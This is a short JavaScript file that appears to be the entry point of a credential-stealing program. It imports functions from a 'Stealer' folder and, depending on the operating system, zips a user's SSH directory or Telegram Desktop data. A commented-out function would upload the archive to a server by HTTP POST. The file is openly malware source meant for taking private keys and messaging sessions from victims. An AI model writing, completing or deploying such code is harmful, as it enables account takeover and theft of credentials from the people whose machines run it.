
import fetch from 'node-fetch';
import { stealSSH } from './Stealer/config.js';
import { stealTelegram } from './Stealer/telegram.js';

if (process.platform == 'win32') {
    stealSSH('telegram-desktop', 'telegram.zip');
}

if (process.platform == 'linux') {
    stealSSH('ssh', 'ssh.zip');
}

// Send file to server
// async function sendFile(file, url) {
//     const formData = new FormData();
//     formData.append('file', fs.createReadStream(file));
//     const response = await fetch(url, {
//         method: 'POST',
//         body: formData
//     });
//     return response.json();
// }

